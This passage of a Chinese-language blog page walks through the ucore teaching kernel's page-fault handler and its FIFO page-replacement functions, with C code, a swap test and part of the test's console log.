;&#xFF0C;&#x505A;&#x8FDB;&#x4E00;&#x6B65;&#x5224;&#x65AD;&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x5B8C;&#x6574;&#x7684;do_pgfault&#x51FD;&#x6570;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vmm.c</span></span><br><span class="line"><span class="comment">/* do_pgfault - &#x5904;&#x7406;&#x9875;&#x4E2D;&#x65AD;&#x5F02;&#x5E38;&#x7684;&#x4E3B;&#x8981;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="comment"> * @mm         : &#x7BA1;&#x7406;&#x53EF;&#x7528;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x7ED3;&#x6784;&#x4F53;</span></span><br><span class="line"><span class="comment"> * @error_code : &#x5904;&#x7406;&#x5668;&#x629B;&#x51FA;&#x7684;&#x5F02;&#x5E38;&#x7801;</span></span><br><span class="line"><span class="comment"> * @addr       : CR2&#x5BC4;&#x5B58;&#x5668;&#x4FDD;&#x5B58;&#x7684;&#x53D1;&#x751F;&#x9875;&#x8BBF;&#x95EE;&#x9519;&#x8BEF;&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_pgfault(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr) {</span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    <span class="comment">//&#x67E5;&#x627E;&#x5305;&#x542B;&#x7F3A;&#x9875;&#x5F02;&#x5E38;addr&#x7684;vma</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> = <span class="title">find_vma</span>(<span class="title">mm</span>, <span class="title">addr</span>);</span><span class="comment">//&#x5728;&#x6D4B;&#x8BD5;&#x4E2D; addr = 100h</span></span><br><span class="line"></span><br><span class="line">    pgfault_num++;</span><br><span class="line">    <span class="comment">//&#x82E5;&#x67E5;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x8BF4;&#x660E;&#x8BE5;&#x5730;&#x5740;&#x65E0;&#x6548;&#xFF0C;&#x4E0D;&#x5408;&#x6CD5;</span></span><br><span class="line">    <span class="keyword">if</span> (vma == <span class="literal">NULL</span> || vma-&gt;vm_start &gt; addr) {</span><br><span class="line">        cprintf(<span class="string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//&#x5224;&#x65AD;&#x5F02;&#x5E38;&#x7C7B;&#x578B;&#xFF0C;&#x4E0E;3&#xFF0C;&#x5373;&amp;11b&#xFF0C;&#x53D6;&#x540E;&#x4E24;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">switch</span> (error_code &amp; <span class="number">3</span>) {</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//&#x7F3A;&#x9875;&#xFF0C;&#x5B58;&#x5728;&#x5199;&#x5F02;&#x5E38;&#xFF0C;&#x4E0B;&#x9762;&#x5224;&#x65AD;&#x7269;&#x7406;&#x9875;&#x662F;&#x5426;&#x53EF;&#x5199;&#xFF0C;&#x82E5;&#x53EF;&#x5199;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x6D41;&#x7A0B;&#x5C06;&#x8BE5;&#x7269;&#x7406;&#x9875;&#x6620;&#x5C04;&#xFF0C;&#x82E5;&#x4E0D;&#x53EF;&#x5199;&#xFF0C;&#x5219;&#x62A5;&#x9519;</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) {</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&apos;s vma cannot write\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//&#x5BF9;&#x5E94;&#x7269;&#x7406;&#x9875;&#x5B58;&#x5728;&#xFF0C;&#x4F46;&#x662F;&#x8BFB;&#x5F02;&#x5E38;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x6743;&#x9650;&#x95EE;&#x9898;&#xFF0C;&#x76F4;&#x63A5;&#x62A5;&#x9519;</span></span><br><span class="line">        cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">//&#x7F3A;&#x9875;&#xFF0C;&#x8BFB;&#x5F02;&#x5E38;&#xFF0C;&#x4E0B;&#x9762;&#x5224;&#x65AD;&#x7269;&#x7406;&#x9875;&#x662F;&#x5426;&#x53EF;&#x8BFB;&#xFF0C;&#x82E5;&#x53EF;&#x8BFB;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x6D41;&#x7A0B;&#x5C06;&#x8BE5;&#x7269;&#x7406;&#x9875;&#x6620;&#x5C04;&#xFF0C;&#x82E5;&#x4E0D;&#x53EF;&#x5199;&#xFF0C;&#x5219;&#x62A5;&#x9519;</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) {</span><br><span class="line">            cprintf(<span class="string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&apos;s vma cannot read or exec\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/* &#x5269;&#x4E0B;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;</span></span><br><span class="line"><span class="comment">     * 1. &#x5199;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x53EF;&#x5199;&#x7269;&#x7406;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment">     * 2. &#x8BFB;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x53EF;&#x8BFB;&#x7269;&#x7406;&#x5730;&#x5740;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> perm = PTE_U;<span class="comment">//perm&#x4E3A;PDE&#xFF08;&#x9875;&#x76EE;&#x5F55;&#x9879;&#xFF09;/PTE&#xFF08;&#x9875;&#x9879;&#xFF09;&#x7684;&#x6743;&#x9650;&#x4F4D;</span></span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) {</span><br><span class="line">        perm |= PTE_W;</span><br><span class="line">    }</span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line"></span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pte_t</span> *ptep=<span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>)) == <span class="literal">NULL</span>) {</span><br><span class="line">        cprintf(<span class="string">&quot;get_pte in do_pgfault failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x5982;&#x679C;&#x8BE5;&#x9875;&#x8868;&#x5185;&#x5BB9;&#x4E3A;0&#xFF0C;&#x8BF4;&#x660E;&#x672A;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#xFF0C;</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) { <span class="comment">// pgdir_alloc_page&#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x5E76;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;</span></span><br><span class="line">        <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) {</span><br><span class="line">            cprintf(<span class="string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> { <span class="comment">// &#x5426;&#x5219;&#x5C31;&#x662F;&#x6620;&#x5C04;&#x5230;swap&#x533A;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x52A0;&#x8F7D;&#x5230;&#x7269;&#x7406;&#x9875;</span></span><br><span class="line">           <span class="comment">// &#x8C03;&#x7528; page_insert &#x91CD;&#x65B0;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;</span></span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) {</span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="number">0</span>) {</span><br><span class="line">                cprintf(<span class="string">&quot;swap_in in do_pgfault failed\n&quot;</span>);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            }    </span><br><span class="line">            page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">            swap_map_swappable(mm, addr, page, <span class="number">1</span>);</span><br><span class="line">            page-&gt;pra_vaddr = addr;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            cprintf(<span class="string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        }</span><br><span class="line">   }</span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4E0B;&#x9762;&#x662F;&#x5B9E;&#x73B0;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x7684;_fifo_map_swappable&#x51FD;&#x6570;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;<span class="comment">//&#x83B7;&#x53D6;&#x961F;&#x5217;&#x7684;&#x8868;&#x5934;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);<span class="comment">//&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x4F7F;&#x7528;&#x7684;&#x7EF4;&#x62A4;&#x7269;&#x7406;&#x9875;&#x7684;Page&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5730;&#x5740;</span></span><br><span class="line"> </span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>);</span><br><span class="line">    list_add(head, entry);<span class="comment">//&#x6240;&#x4EE5;&#x5B9E;&#x73B0;&#x94FE;&#x63A5;&#x6548;&#x679C;&#xFF0C;&#x53EA;&#x8981;&#x6DFB;&#x52A0;&#x8FD9;&#x4E00;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x53CC;&#x5411;&#x94FE;&#x8868;&#x7EF4;&#x62A4;&#x4E00;&#x4E2A;&#x961F;&#x5217;&#xFF0C;&#x7528;&#x6765;&#x4FDD;&#x5B58;&#x7269;&#x7406;&#x9875;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#x3002;&#x6BCF;&#x6B21;&#x4E0D;&#x8BBA;&#x91CD;&#x65B0;&#x5206;&#x914D;&#x7269;&#x7406;&#x9875;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#xFF0C;&#x8FD8;&#x662F;&#x5C06;&#x78C1;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x88C5;&#x5165;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5EFA;&#x7ACB;&#x6620;&#x5C04;&#xFF0C;&#x5373;&#x6BCF;&#x6B21;&#x7269;&#x7406;&#x9875;&#x88AB;&#x4F7F;&#x7528;&#xFF0C;&#x90FD;&#x4F1A;&#x66F4;&#x65B0;Page&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;pra_page_link&#x94FE;&#x8868;&#xFF0C;&#x4E0A;&#x9762;&#x8BF4;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x94FE;&#x8868;&#x6309;&#x65F6;&#x95F4;&#x5148;&#x540E;&#x8FDE;&#x63A5;&#x88AB;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x7528;&#x4EE5;FIFO&#x7684;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x65B0;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#x90FD;&#x4F1A;&#x94FE;&#x63A5;&#x5728;&#x94FE;&#x8868;&#x7684;&#x672B;&#x5C3E;&#x3002;</p>
<p>&#x4E0B;&#x9762;&#x662F;&#x5B9E;&#x73B0;&#x7684;FIFO&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x7684;_fifo_swap_out_victim&#x51FD;&#x6570;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">{</span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;<span class="comment">//&#x83B7;&#x53D6;&#x961F;&#x5217;&#x7684;&#x8868;&#x5934;</span></span><br><span class="line">     assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">list_entry_t</span> *le = head-&gt;next;</span><br><span class="line">     assert(head!=le);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">pra_page_link</span>);</span><span class="comment">//&#x901A;&#x8FC7;Page&#x7684;&#x6210;&#x5458;pra_page_link&#x83B7;&#x53D6;Page&#x7684;&#x6307;&#x9488;</span></span><br><span class="line">     list_del(le);</span><br><span class="line">     assert(p !=<span class="literal">NULL</span>);</span><br><span class="line">     *ptr_page = p;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4E0A;&#x9762;&#x7684;&#x961F;&#x5217;&#x4FDD;&#x5B58;&#x7684;&#x662F;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x5982;&#x679C;&#x7269;&#x7406;&#x5185;&#x5B58;&#x6EE1;&#x4E86;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5C06;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#x7F6E;&#x6362;&#x5230;&#x5916;&#x5B58;&#x4E2D;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;_fifo_swap_out_victim&#x5C31;&#x662F;&#x5220;&#x9664;&#x961F;&#x5217;&#x4E2D;&#x5BF9;&#x9996;&#x7684;&#x6700;&#x65E9;&#x4F7F;&#x7528;&#x7684;&#x7269;&#x7406;&#x9875;&#xFF0C;&#x5E76;&#x7528;ptr_page&#x4FDD;&#x5B58;&#x3002;</p>
<h2 id="&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;"><a href="#&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;" class="headerlink" title="&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;"></a>&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x6570;&#x636E;</h2><p>&#x5728;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x53EA;&#x63D0;&#x4F9B;&#x4E86;4&#x4E2A;&#x7269;&#x7406;&#x9875;&#x8FDB;&#x884C;&#x5206;&#x914D;&#xFF0C;&#x9996;&#x5148;&#x5EFA;&#x7ACB;&#x4E86;4&#x4E2A;&#x7269;&#x7406;&#x9875;&#x7684;&#x6620;&#x5C04;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//swap.c</span></span><br><span class="line"><span class="comment">//CHECK_VALID_PHY_PAGE_NUM = 4</span></span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;CHECK_VALID_PHY_PAGE_NUM;i++) {</span><br><span class="line">          check_rp[i] = alloc_page();</span><br><span class="line">          assert(check_rp[i] != <span class="literal">NULL</span> );</span><br><span class="line">          assert(!PageProperty(check_rp[i]));</span><br><span class="line">     }</span><br></pre></td></tr></table></figure>
<p>&#x7136;&#x540E;&#x901A;&#x8FC7;&#x76F4;&#x63A5;&#x5199;&#x5185;&#x5B58;&#x6570;&#x636E;&#x89E6;&#x53D1;&#x7F3A;&#x9875;&#x4E2D;&#x65AD;&#xFF0C;&#x603B;&#x5171;&#x53D1;&#x751F;12&#x6B21;&#x5185;&#x5B58;&#x5199;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//swap_fifo.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_check_swap(<span class="keyword">void</span>) {</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page c in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;_</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page a in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page d in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page b in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page e in fifo_check_swap\n&quot;</span>);<span class="comment">//&#x9875;&#x9762;&#x7F6E;&#x6362;&#x5F00;&#x59CB;</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x5000</span> = <span class="number">0x0e</span>;<span class="comment">//&#x9875;&#x9762;&#x7F6E;&#x6362;&#x5F00;&#x59CB;</span></span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page b in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page a in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">6</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page b in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">7</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page c in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">8</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page d in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">9</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page e in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x5000</span> = <span class="number">0x0e</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">10</span>);</span><br><span class="line">    cprintf(<span class="string">&quot;write Virt Page a in fifo_check_swap\n&quot;</span>);</span><br><span class="line">    assert(*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> == <span class="number">0x0a</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">11</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x4E0B;&#x9762;&#x5206;&#x6790;&#x6D4B;&#x8BD5;&#x7ED3;&#x679C;</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> up init env <span class="keyword">for</span> check_swap begin!</span><br><span class="line">page fault at 0x00001000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">page fault at 0x00002000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">page fault at 0x00003000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">page fault at 0x00004000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line"><span class="builtin-name">set</span> up init env <span class="keyword">for</span> check_swap over!</span><br><span class="line">write Virt<span class="built_in"> Page </span>c <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>a <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>d <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>b <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>e <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00005000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x1000 <span class="keyword">to</span> disk swap entry 2</span><br><span class="line">write Virt<span class="built_in"> Page </span>b <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">write Virt<span class="built_in"> Page </span>a <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00001000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x2000 <span class="keyword">to</span> disk swap entry 3</span><br><span class="line">swap_in: load disk swap entry 2 with swap_page <span class="keyword">in</span> vadr 0x1000</span><br><span class="line">write Virt<span class="built_in"> Page </span>b <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00002000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span class="built_in"> page </span><span class="keyword">in</span> vaddr 0x3000 <span class="keyword">to</span> disk swap entry 4</span><br><span class="line">swap_in: load disk swap entry 3 with swap_page <span class="keyword">in</span> vadr 0x2000</span><br><span class="line">write Virt<span class="built_in"> Page </span>c <span class="keyword">in</span> fifo_check_swap</span><br><span class="line">page fault at 0x00003000: K/W [<span class="literal">no</span><span class="built_in"> page </span>found].</span><br><span class="line">*ptep!=0</span><br><span class="line">swap_out: i 0, store<span 